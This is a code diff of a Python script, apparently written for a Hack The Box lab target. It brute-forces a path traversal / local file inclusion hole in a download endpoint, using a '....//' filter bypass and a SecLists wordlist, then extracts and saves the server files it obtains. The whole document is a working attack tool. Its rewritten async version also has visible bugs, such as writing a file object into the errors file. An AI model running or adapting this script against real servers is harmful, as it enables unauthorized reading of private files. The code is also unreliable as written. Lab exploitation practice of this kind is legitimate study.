@@ -2,13 +2,12 @@
 # It will print out two files, one with all of the results and one with the errors in your current working directory.
 # It will also print out what position it is at.
 
-import requests
-import zipfile
+import aiohttp
+import asyncio
 import io
-import os
-import sys
 import logging
-import concurrent.futures
+import os
+import zipfile
 
 cwd = os.getcwd()
 
@@ -18,56 +17,45 @@ errors_path = cwd + "/" + error_fileName
 result_fileName = "result.txt"
 result_path = cwd + "/" + result_fileName
 
-#filename = sys.argv[1]
 if os.path.isfile(result_path):
     os.remove(result_path)
 
 if os.path.isfile(errors_path):
     os.remove(errors_path)
 
-wordlist_path = "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
-# #wordlist_path = cwd + "/LFI_fileFinder_wordlist.txt"
+#wordlist_path = "LFI_fileFinder_wordlist.txt"
+wordlist_path = "/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt"
 
-file =  open(f"{wordlist_path}", mode="r")
-file_errors =  open(f"{errors_path}", mode="w")
-result_file = open('result.txt', 'a')
-
-words = file.readlines()
-#r = requests.Response()
+with open(wordlist_path, mode="r") as file:
+    words = file.readlines()
 
 wordsToCheck = len(words)
 
-def fileloop():
-    print(wordsToCheck)
-    wordsChecked = 0
-    for word in words:
-        wordsChecked = wordsChecked + 1
-        print(str(wordsChecked) + "/" + str(wordsToCheck) + "\t" + "Checking: " + word )
-        r = requests.get("http://snoopy.htb/download?file=....//....//....//....//....//....//....//" + word.strip(), allow_redirects=True)
-        if(isContentEmpty(r)):
-            continue
-        
-        print(word.strip())
-        print("Added file.")
-    
-        result_file.write(printfilecontents(r))
-    closeFiles()
+async def fetch(session, word):
+    url = f"http://snoopy.htb/download?file=....//....//....//....//....//....//....//{word}"
+    async with session.get(url) as response:
+        if not response.content_length or response.content_length == 0:
+            return None
+        return await response.read()
 
-def closeFiles():
-    result_file.close()
-    file.close()
-    file_errors.close()
+async def fileloop():
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        wordsChecked = 0
+        for word in words:
+            wordsChecked = wordsChecked + 1
+            print(str(wordsChecked) + "/" + str(wordsToCheck) + "\t" + "Checking: " + word )
+            task = asyncio.ensure_future(fetch(session, word))
+            tasks.append(task)
+        results = await asyncio.gather(*tasks)
+        for result in results:
+            if result:
+                printfilecontents(result)
+      
+                
 
-def printfilecontents(r):
-    if(isContentEmpty(r)):
-        return ""
 
-    print(r.headers)
-
-    contentBytes = bytes(r.content)
-    if(contentBytes is b''):
-        return ""
-
+def printfilecontents(contentBytes):
     z = zipfile.ZipFile(io.BytesIO(contentBytes))
     z.extractall()
 
@@ -78,29 +66,31 @@ def printfilecontents(r):
                 contents = contents + f.read()
                 contents = contents + "-" * 12 + "\n"
                 print(contents)
+                closeFiles(str(contents))
             except:
-                print("Not able to read file: " + filename)
-                file_errors.write(filename)
-                continue
-
-    for filename in z.namelist():
+                print("Not able to read file:" + filename)
+                with open(errors_path, mode="a") as file_errors:
+                    file_errors.write(filename + " was unable to be read. \n")
+                    
         os.remove(filename)
 
-    return contents
-
-def isContentEmpty(r):
-    if("'Content-Length': '0'" in r.headers or not 'Content-Length' in r.headers):
-        return True
-    return False
-
-
+def closeFiles(contents):
+    result_file = open(result_path, mode="a")
+    result_file.write(contents)
+    result_file.close()
+    
+    file = open(wordlist_path, mode="r")
+    file.close()
+    
+    file_errors = open(errors_path, mode="a")
+    file_errors.write(file_errors)
+    file_errors.close()
+   
 if __name__ == "__main__":
     format = "%(asctime)s: %(message)s"
-    logging.basicConfig(format=format, level=logging.INFO,
-                        datefmt="%H:%M:%S")
+    logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
-        executor.map(fileloop, range(8))
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(fileloop())
 
 
-fileloop()
